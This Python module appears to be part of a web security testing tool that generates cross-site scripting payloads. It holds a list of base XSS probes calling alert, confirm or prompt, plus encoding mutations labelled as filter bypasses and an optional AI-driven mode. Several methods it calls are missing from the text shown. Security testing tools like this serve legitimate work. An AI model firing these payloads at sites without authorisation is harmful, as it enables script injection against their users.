#!/usr/bin/env python3
"""
Advanced Payload Generator with AI Integration
"""

import json
import random
import re
from typing import List, Dict, Optional
from dataclasses import dataclass

@dataclass
class PayloadInfo:
    """Information about a generated payload"""
    payload: str
    context: str
    bypass_technique: Optional[str] = None
    confidence: float = 0.0
    mutation_type: Optional[str] = None

class PayloadGenerator:
    """Intelligent payload generator with AI capabilities"""
    
    def __init__(self, settings):
        self.settings = settings
        self.base_payloads = self._load_base_payloads()
        self.context_payloads = self._load_context_payloads()
        self.bypass_payloads = self._load_bypass_payloads()
        
        # AI model for payload generation (loaded when AI mode is enabled)
        self.ai_model = None
        if settings.ai_mode:
            self._load_ai_model()
    
    def generate_context_payloads(self, context: str, injection_point: Dict) -> List[PayloadInfo]:
        """Generate payloads based on injection context"""
        payloads = []
        
        # Get base payloads for context
        base_payloads = self.context_payloads.get(context, self.base_payloads)
        
        for base_payload in base_payloads:
            # Generate mutations
            mutations = self._generate_mutations(base_payload, context)
            
            for mutation in mutations:
                payload_info = PayloadInfo(
                    payload=mutation['payload'],
                    context=context,
                    bypass_technique=mutation.get('technique'),
                    confidence=mutation.get('confidence', 0.5),
                    mutation_type=mutation.get('type')
                )
                payloads.append(payload_info)
        
        return payloads
    
    def generate_ai_payloads(self, context: str, injection_point: Dict) -> List[PayloadInfo]:
        """Generate AI-powered payloads"""
        if not self.ai_model:
            return self.generate_context_payloads(context, injection_point)
        
        # Use AI model to generate contextual payloads
        ai_payloads = self.ai_model.generate_payloads(context, injection_point)
        
        # Combine with traditional payloads
        traditional_payloads = self.generate_context_payloads(context, injection_point)
        
        return ai_payloads + traditional_payloads
    
    def _generate_mutations(self, base_payload: str, context: str) -> List[Dict]:
        """Generate payload mutations for bypass"""
        mutations = []
        
        # Character encoding mutations
        mutations.extend(self._generate_encoding_mutations(base_payload))
        
        # Case variation mutations
        mutations.extend(self._generate_case_mutations(base_payload))
        
        # Quote escape mutations
        mutations.extend(self._generate_quote_mutations(base_payload))
        
        # Event handler mutations
        mutations.extend(self._generate_event_mutations(base_payload))
        
        # Context-specific mutations
        if context == "html":
            mutations.extend(self._generate_html_mutations(base_payload))
        elif context == "js":
            mutations.extend(self._generate_js_mutations(base_payload))
        elif context == "attr":
            mutations.extend(self._generate_attr_mutations(base_payload))
        
        return mutations
    
    def _generate_encoding_mutations(self, payload: str) -> List[Dict]:
        """Generate encoding-based mutations"""
        mutations = []
        
        # URL encoding
        url_encoded = payload.replace('<', '%3C').replace('>', '%3E')
        mutations.append({
            'payload': url_encoded,
            'technique': 'url_encoding',
            'confidence': 0.7,
            'type': 'encoding'
        })
        
        # HTML entity encoding
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        mutations.append({
            'payload': html_encoded,
            'technique': 'html_encoding',
            'confidence': 0.6,
            'type': 'encoding'
        })
        
        # Hex encoding
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
        mutations.append({
            'payload': hex_encoded,
            'technique': 'hex_encoding',
            'confidence': 0.8,
            'type': 'encoding'
        })
        
        return mutations
    
    def _load_base_payloads(self) -> List[str]:
        """Load base XSS payloads"""
        try:
            with open('payloads/payloads.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                '</script><script>alert(1)</script>',
                '<script>confirm(1)</script>',
                '<script>prompt(1)</script>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>'
            ]
